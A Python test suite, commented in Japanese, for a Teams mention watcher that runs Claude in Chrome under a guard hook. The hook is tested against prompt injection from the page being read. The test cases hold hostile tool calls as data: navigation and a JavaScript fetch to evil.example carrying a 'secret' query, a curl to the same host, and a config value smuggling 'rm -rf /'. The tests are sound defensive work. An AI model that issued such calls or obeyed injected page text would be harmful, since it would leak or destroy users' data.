"""Teams の見張り（Mac の側。scripts/teams_watch.py・scripts/teams_hook.py）の試験。本物の Teams・Chrome・claude には触れない（偽物に差し替える）。
確かめること:
- 一覧を項目に分ける（チャネルの投稿・題名の無い投稿・チャットのメンション・get_page_text の見出し）。形が合わなければ組織ごと「読めない」（サインイン・組織違い・形）
- id: 一覧の時刻の書き方が変わっても同じ（当日 11:49 → 翌日 11/12）。同じ文面の依頼が別の日に来たら別の id、同じ日に並んだら分ける
- 置き場に書く: 組織を初めて読んだ分は既読扱い・次から新しい分だけ足す・二度足さない・行の数の上限
- 関門（相手の位置）: 読んだページの指示で LLM が動こうとしても、クリック・文字の入力・ほかの URL・JavaScript・組み込みの道具は通らない。
  フックが壊れていても通さない（sh で包む）。写し取りは get_page_text の結果だけを書く
- 1 回の動き: 時間の外は読まずに印だけ書く・組織ごとの読めた/読めない・二重に動かない・設定の形を確かめる
- claude に渡す指定: 組み込みの道具なし・ほかの MCP なし・確認なしで断る・その回の URL だけを関門に渡す・利用者の設定で許可済みの mcp__ を外す
使い方: uv run spike/teams_watch_test.py"""
import json
import os
import subprocess
import sys
import tempfile
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
TMP = Path(tempfile.mkdtemp())
os.environ.update({"VL_CONFIG_DIR": str(TMP / "config"), "VL_TEAMS_STATE": str(TMP / "state"), "VL_HERMES_HOME": str(TMP / "hermes")})
sys.path.insert(0, str(ROOT / "scripts"))
import teams_watch as tw  # noqa: E402

results = []


def check(name, got, want):
    results.append((name, got == want, got, want))


def unreadable(fn):
    try:
        fn()
        return None
    except tw.Unreadable as e:
        return e.args[0]


TENANT_A = "11111111-2222-3333-4444-555555555555"
TENANT_B = "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"


def page(org="組織A", items=(), header=True):
    lines = (["Title: チャット | Microsoft Teams", "URL: https://teams.microsoft.com/v2/", "Source element: <body>", "---"] if header else [])
    lines += [org, "常に最新情報を確認するために、デスクトップ通知をオンにしてください。", "クイック ビュー", "メンション", "フォロー中のスレッド",
              "コンテキスト メニューあり", "メンション", "未読", "チャネル", "チャット"]
    for it in items:
        lines += list(it)
    lines += ["@メンションを選択すると、ここに表示されます"]
    return "\n".join(lines)


ITEMS = [
    ("General", "【本番の件】", "山田 花子: 田中さん 締め切りは 11/19 でよいでしょうか", "11:49"),
    ("General", "山田 花子: 題名の無い投稿です", "昨日"),
    ("佐藤 太郎", "田中さん 資料を見ていただけますか", "11/10"),
    ("プライベートチャネル", "【依頼】削除", "鈴木: リスト内の削除をお願いします", "11/02"),
    ("プライベートチャネル", "【依頼】削除", "鈴木: リスト内の削除をお願いします", "10/26"),
]
NOW = time.mktime((2026, 11, 12, 13, 0, 0, 0, 0, -1))
TOMORROW = NOW + 86400
items = tw.parse(page(items=ITEMS), "組織A")
check("一覧: チャネルの投稿・題名の無い投稿・チャットのメンションを分ける",
      [(i["channel"], i["title"], i["sender"], i["shown"]) for i in items],
      [("General", "【本番の件】", "山田 花子", "11:49"), ("General", "", "山田 花子", "昨日"), ("チャット", "", "佐藤 太郎", "11/10"),
       ("プライベートチャネル", "【依頼】削除", "鈴木", "11/02"), ("プライベートチャネル", "【依頼】削除", "鈴木", "10/26")])
check("一覧: get_page_text の見出しが無くても読める", len(tw.parse(page(items=ITEMS, header=False), "組織A")), 5)
check("一覧: 一覧が空なら 0 件", tw.parse(page(items=[]), "組織A"), [])
check("一覧: 右上の組織の名前が違えば「組織」で読めない（別の組織の一覧を取り違えない）", unreadable(lambda: tw.parse(page(org="組織B", items=ITEMS), "組織A")), "org")
check("一覧: サインインの画面なら「サインイン」", unreadable(lambda: tw.parse("Title: x\nURL: y\nSource element: z\n---\nサインイン\nアカウントを選択", "組織A")), "signin")
check("一覧: 見出しが無ければ「形」（左の「メンション」以外を開いている）",
      unreadable(lambda: tw.parse(page(items=ITEMS).replace("未読\nチャネル\nチャット", "未読\nチャット"), "組織A")), "parse")
check("一覧: 時刻の前の行の数が合わなければ「形」（黙って取り違えない）",
      unreadable(lambda: tw.parse(page(items=[("A", "B", "C", "D: E", "11:49")]), "組織A")), "parse")
check("一覧: 終わりの行が無ければ「形」", unreadable(lambda: tw.parse(page(items=ITEMS).replace("@メンションを選択すると、ここに表示されます", ""), "組織A")), "parse")

ids_today = tw.item_ids(TENANT_A, items, NOW)
items_tomorrow = tw.parse(page(items=[("General", "【本番の件】", "山田 花子: 田中さん 締め切りは 11/19 でよいでしょうか", "11/12"),
                                      ("General", "山田 花子: 題名の無い投稿です", "11/11")] + ITEMS[2:]), "組織A")
check("id: 翌日に一覧の時刻の書き方が変わっても（11:49 → 11/12、昨日 → 11/11）同じ id", tw.item_ids(TENANT_A, items_tomorrow, TOMORROW), ids_today)
check("id: 同じ文面の依頼が別の日に来たら別の id（11/02 と 10/26）", ids_today[3] != ids_today[4], True)
same_day = tw.parse(page(items=[("C", "T", "S: 同じ文", "10:00"), ("C", "T", "S: 同じ文", "09:00")]), "組織A")
check("id: 同じ日に同じ文面が並んでも分ける", len(set(tw.item_ids(TENANT_A, same_day, NOW))), 2)
check("id: 組織が違えば別の id", tw.item_ids(TENANT_B, items, NOW) != ids_today, True)
check("日付: 先の日付に見える「12/30」は去年", tw.shown_date("12/30", NOW), "2025-12-30")

ORG_A = {"name": "組織A", "tenant": TENANT_A}
FEED = TMP / "hermes/voice-loop/teams.jsonl"
rows = lambda: [json.loads(l) for l in FEED.read_text().splitlines()]  # noqa: E731
check("置き場: 組織を初めて読んだ分は、足した数 0（全部を既読扱い）", tw.merge(ORG_A, items, NOW), 0)
check("置き場: 初めての分は baseline", [r["baseline"] for r in rows()], [True] * 5)
new = [("General", "【新しい件】", "山田 花子: 田中さん 見積もりの件です", "13:30")] + ITEMS
check("置き場: 次から新しい分だけ足す", (tw.merge(ORG_A, tw.parse(page(items=new), "組織A"), NOW + 1800), len(rows()), rows()[-1]["baseline"]), (1, 6, False))
check("置き場: 同じ一覧をもう一度読んでも足さない", (tw.merge(ORG_A, tw.parse(page(items=new), "組織A"), NOW + 3600), len(rows())), (0, 6))
check("置き場: 行は id・組織・チャネル・題名・送り手・本文・一覧の時刻・最初に見た時刻・既読扱い",
      sorted(rows()[-1]), sorted(["id", "tenant", "org", "channel", "title", "sender", "body", "shown", "first_seen", "baseline"]))
evil = [{"channel": "General", "title": "【件\x1b[2K】", "sender": "山田", "body": "本文\u202e逆\n改行", "shown": "14:00"}]
tw.merge(ORG_A, evil, NOW + 5400)
check("置き場: 制御文字・向きを変える文字は空白にする", any(c in json.dumps(rows()[-1], ensure_ascii=False) for c in ("\x1b", "\u202e")), False)
check("置き場: Hermes（コンテナの別の利用者）が読める（644）", oct(FEED.stat().st_mode & 0o777), "0o644")
old_keep, tw.KEEP = tw.KEEP, 3
tw.merge(ORG_A, [{"channel": "C", "title": "T", "sender": "S", "body": str(k), "shown": "15:00"} for k in range(5)], NOW + 7200)
check("置き場: 行の数は上限まで（古いものから落とす）", len(rows()), 3)
tw.KEEP = old_keep
ORG_D = {"name": "組織D", "tenant": "dddddddd-dddd-dddd-dddd-dddddddddddd"}
dup = lambda d: ("チャネル", "【依頼】", "鈴木: リスト内の削除をお願いします", d)  # noqa: E731
tw.merge(ORG_D, tw.parse(page(items=[dup("11/02"), dup("10/26")]), "組織A"), NOW - 86400 * 3)
tw.merge(ORG_D, tw.parse(page(items=[dup("11/02"), dup("10/26")]), "組織A"), NOW - 86400 * 2)
check("id: 同じ文面の古い依頼が一覧の下から落ちたのと同じ回に、同じ文面の新しい依頼が来ても、新しいほうを足す",
      tw.merge(ORG_D, tw.parse(page(items=[dup("11:30"), dup("11/02")]), "組織A"), NOW), 1)

# ---------- 関門（相手の位置） ----------
URL = tw.url_of(TENANT_A)


def hook(mode, payload, url=URL, extra_env=None):
    env = {**os.environ, "VL_TEAMS_URL": url, "VL_TEAMS_OUT": str(TMP / "cap.txt"), **(extra_env or {})}
    return subprocess.run(["sh", "-c", tw.hook_command(mode)], input=payload if isinstance(payload, str) else json.dumps(payload),
                          capture_output=True, text=True, env=env).returncode


P = "mcp__claude-in-chrome__"
cases = [
    ({"tool_name": "ToolSearch", "tool_input": {"query": "select:x"}}, 0),
    ({"tool_name": P + "tabs_context_mcp", "tool_input": {"createIfEmpty": True}}, 0),
    ({"tool_name": P + "navigate", "tool_input": {"url": URL, "tabId": 1}}, 0),
    ({"tool_name": P + "computer", "tool_input": {"action": "wait", "duration": 8, "tabId": 1}}, 0),
    ({"tool_name": P + "get_page_text", "tool_input": {"tabId": 1}}, 0),
    ({"tool_name": P + "tabs_close_mcp", "tool_input": {"tabId": 1}}, 0),
    ({"tool_name": P + "navigate", "tool_input": {"url": "https://evil.example/?q=secret"}}, 2),
    ({"tool_name": P + "navigate", "tool_input": {"url": tw.url_of(TENANT_B)}}, 2),
    ({"tool_name": P + "navigate", "tool_input": {"url": URL + "&x=1"}}, 2),
    ({"tool_name": P + "navigate", "tool_input": {"url": "back", "tabId": 1}}, 2),
    ({"tool_name": P + "computer", "tool_input": {"action": "left_click", "coordinate": [10, 10], "tabId": 1}}, 2),
    ({"tool_name": P + "computer", "tool_input": {"action": "left_click", "tabId": 1}}, 2),
    ({"tool_name": P + "computer", "tool_input": {"action": "scroll", "tabId": 1}}, 2),
    ({"tool_name": P + "computer", "tool_input": {"action": "type", "text": "了解です", "tabId": 1}}, 2),
    ({"tool_name": P + "computer", "tool_input": {"action": "key", "text": "Enter", "tabId": 1}}, 2),
    ({"tool_name": P + "computer", "tool_input": {"action": "wait", "duration": 1, "tabId": 1, "text": "x"}}, 2),
    ({"tool_name": P + "javascript_tool", "tool_input": {"text": "fetch('https://evil.example')"}}, 2),
    ({"tool_name": P + "form_input", "tool_input": {}}, 2),
    ({"tool_name": P + "find", "tool_input": {"query": "送信ボタン"}}, 2),
    ({"tool_name": P + "tabs_create_mcp", "tool_input": {}}, 2),
    ({"tool_name": "Bash", "tool_input": {"command": "curl https://evil.example"}}, 2),
    ({"tool_name": "Write", "tool_input": {"file_path": "/tmp/x", "content": "x"}}, 2),
    ({"tool_name": "mcp__claude_ai_Slack__slack_send_message", "tool_input": {}}, 2),
]
got = [hook("guard", c) for c, _ in cases]
check("相手の位置: 関門は、決めた道具・その回の URL・wait だけを通し、クリック・文字・キー・ほかの URL・JavaScript・組み込みの道具・送る道具を止める",
      got, [w for _, w in cases])
check("相手の位置: VL_TEAMS_URL が無ければ navigate も通さない", hook("guard", cases[2][0], url=""), 2)
check("関門: 読めない入力は通さない", hook("guard", "これは JSON ではない"), 2)
check("関門: フック（Python）が動かなくても通さない（sh で包んで 2 に直す）",
      subprocess.run(["sh", "-c", tw.hook_command("guard").replace(sys.executable, "/nonexistent/python")], input=json.dumps(cases[0][0]),
                     capture_output=True, text=True).returncode, 2)

cap = TMP / "cap.txt"
hook("capture", {"tool_name": P + "get_page_text", "tool_response": [{"type": "text", "text": "一行目"}, {"type": "image"}, {"type": "text", "text": "二行目"}]})
check("写し取り: get_page_text の文字の塊をつないで書く（本人だけが読める 600）", (cap.read_text(), oct(cap.stat().st_mode & 0o777)), ("一行目\n二行目", "0o600"))
hook("capture", {"tool_name": P + "navigate", "tool_response": [{"type": "text", "text": "ちがう"}]})
check("写し取り: ほかの道具の結果は書かない", cap.read_text(), "一行目\n二行目")

# ---------- 1 回の動き ----------
CFG = TMP / "config/teams.json"
CFG.parent.mkdir(parents=True, exist_ok=True)
CFG.write_text(json.dumps({"orgs": [{"name": "組織A", "tenant": TENANT_A}, {"name": "組織B", "tenant": TENANT_B}], "hours": [8, 20]}), encoding="utf-8")
STATUS = TMP / "hermes/voice-loop/teams-status.json"
calls = []


def reader(cfg, org):
    calls.append(org["tenant"])
    if org["tenant"] == TENANT_B:
        raise tw.Unreadable("signin")
    return page(items=new)


night = time.mktime((2026, 11, 12, 22, 0, 0, 0, 0, -1))
check("1 回: 時間の外は読まない（印だけ書く）", (tw.run(night, reader), calls, json.loads(STATUS.read_text())["at"]), (0, [], night))
noon = time.mktime((2026, 11, 13, 12, 0, 0, 0, 0, -1))
tw.run(noon, reader)
st = json.loads(STATUS.read_text())
check("1 回: 組織ごとに読めた・読めない（理由の種類）を書く",
      ({k: (v["ok"], v["reason"]) for k, v in st["orgs"].items()}, st["at"]), ({TENANT_A: (True, ""), TENANT_B: (False, "signin")}, noon))
saturday = time.mktime((2026, 11, 14, 12, 0, 0, 0, 0, -1))
calls.clear()
tw.run(saturday, reader)
check("1 回: 決めた曜日の外（土曜）は読まない", calls, [])
CFG.write_text(json.dumps({"orgs": [{"name": "組織A", "tenant": TENANT_A}]}), encoding="utf-8")
tw.run(noon + 1800, reader)
check("1 回: 設定から外した組織の状態は消す", list(json.loads(STATUS.read_text())["orgs"]), [TENANT_A])
for bad in ({"orgs": [{"name": "A", "tenant": "not-a-tenant"}]}, {"orgs": [{"name": "", "tenant": TENANT_A}]}, {"orgs": [], "hours": [9]},
            {"orgs": [], "model": "haiku; rm -rf /"}, {"orgs": [], "days": [7]}):
    CFG.write_text(json.dumps(bad), encoding="utf-8")
    results.append((f"設定: 形の合わない設定は断る {json.dumps(bad, ensure_ascii=False)[:40]}", tw.run(noon, reader) == 1, None, None))
CFG.write_text(json.dumps({"orgs": [{"name": "組織A", "tenant": TENANT_A}], "hours": [0, 24], "days": list(range(7))}), encoding="utf-8")
import fcntl  # noqa: E402
(TMP / "state").mkdir(parents=True, exist_ok=True)
with open(TMP / "state/run.lock", "w") as lk:
    fcntl.flock(lk, fcntl.LOCK_EX)
    calls.clear()
    tw.run(noon, reader)
check("1 回: 前の回が動いている間は、重ねて動かない", calls, [])

# ---------- claude に渡す指定 ----------
fake = TMP / "fake_claude.py"
fake.write_text(f"""import json, os, sys
open({str(TMP / 'argv.json')!r}, 'w').write(json.dumps({{"argv": sys.argv[1:], "url": os.environ.get("VL_TEAMS_URL"), "herdr": [k for k in os.environ if k.startswith("HERDR_")]}}))
open(os.environ["VL_TEAMS_OUT"], "w").write("ページの文字")
print(json.dumps({{"total_cost_usd": 0.004}}))
""", encoding="utf-8")
fake_sh = TMP / "claude"
fake_sh.write_text(f"#!/bin/sh\nexec {sys.executable} {fake} \"$@\"\n")
fake_sh.chmod(0o755)
os.environ["VL_TEAMS_CLAUDE"] = str(fake_sh)
os.environ["HERDR_PANE_ID"] = "x"
settings = TMP / "settings.json"
settings.write_text(json.dumps({"permissions": {"allow": ["mcp__claude_ai_Slack__slack_send_message", "Bash(ls:*)"]}}))
tw.SETTINGS_FILES = [settings]
text = tw.read_org(tw.load_config(), {"name": "組織A", "tenant": TENANT_A})
a = json.loads((TMP / "argv.json").read_text())
argv = a["argv"]
opt = lambda k: argv[argv.index(k) + 1] if k in argv else None  # noqa: E731
check("claude: 読んだ文字は写し取りのファイルから受け取る", text, "ページの文字")
check("claude: 組み込みの道具なし・ほかの MCP なし・確認なしで断る・会話を残さない",
      (opt("--tools"), "--strict-mcp-config" in argv, opt("--mcp-config"), opt("--permission-mode"), "--no-session-persistence" in argv, "--chrome" in argv),
      ("", True, '{"mcpServers":{}}', "dontAsk", True, True))
check("claude: 関門に渡す URL は、その回の組織の URL だけ", (a["url"], URL in opt("-p")), (URL, True))
check("claude: 利用者の設定で許可済みの mcp__ の規則を外す（Bash の規則は組み込みの道具なしで消える）", opt("--disallowedTools"), "mcp__claude_ai_Slack__slack_send_message")
check("claude: 関門と写し取りのフックを付ける（関門は sh で包む）",
      [h["matcher"] for h in json.loads(opt("--settings"))["hooks"]["PreToolUse"]] + [json.loads(opt("--settings"))["hooks"]["PreToolUse"][0]["hooks"][0]["command"].startswith("sh -c ")],
      ["*", True])
check("claude: herdr の印を渡さない", a["herdr"], [])
check("claude: 記録には回数と費用の目安だけを残す（ページの文字を残さない）", "ページの文字" in (TMP / "state/runs.log").read_text(), False)
pl = __import__("plistlib").loads(tw.plist())
check("plist: 30 分ごとに run を呼ぶ", (pl["Label"], pl["ProgramArguments"][-1], pl["StartInterval"]), ("local.voice-loop.teams", "run", 1800))

import re as _re  # noqa: E402
_RAW = _re.compile("[\x00-\x08\x0b-\x1f\x7f-\x9f\u200b-\u200f\u2028-\u202e\u2060-\u2069\ufeff]")
srcs = [ROOT / "scripts/teams_watch.py", ROOT / "scripts/teams_hook.py", ROOT / "templates/hermes/watch/vl_teams.py", ROOT / "templates/hermes/watch/vl_watch.py",
        ROOT / "templates/hermes/watch/vl_items.py", Path(__file__)]
check("ソースに、生の制御文字・向きを変える文字・見えない文字を置かない（書くときは \\u の形で）",
      [f.name for f in srcs if _RAW.search(f.read_text(encoding="utf-8"))], [])

ok = sum(r[1] for r in results)
for name, passed, got_, want in results:
    print(("✓ " if passed else "✗ ") + name + ("" if passed else f"\n    得た値: {got_!r}\n    期待:   {want!r}"))
print(f"\n{ok}/{len(results)} 件が期待どおり")
sys.exit(0 if ok == len(results) else 1)
